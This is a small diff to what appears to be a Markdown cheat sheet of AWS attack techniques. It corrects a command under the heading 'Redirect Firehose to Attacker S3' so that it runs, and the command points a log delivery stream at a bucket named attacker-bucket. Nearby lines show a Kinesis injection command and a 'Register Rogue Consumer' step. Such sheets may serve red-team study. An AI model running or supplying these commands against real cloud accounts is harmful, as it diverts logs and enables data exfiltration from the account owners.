@@ -152,7 +152,7 @@ aws kinesis put-record --stream-name app-events --partition-key inject --data 'e
 
 **Redirect Firehose to Attacker S3**
 ```bash
-aws firehose update-destination --delivery-stream-name logs --destination-id dest-1 --s3-destination-update BucketARN=arn:aws:s3:::attacker-bucket,RoleARN=arn:aws:iam::123:role/firehose
+aws firehose update-destination --delivery-stream-name logs --current-delivery-stream-version-id 1 --destination-id dest-1 --s3-destination-update BucketARN=arn:aws:s3:::attacker-bucket,RoleARN=arn:aws:iam::123:role/firehose
 ```
 
 **Register Rogue Consumer**
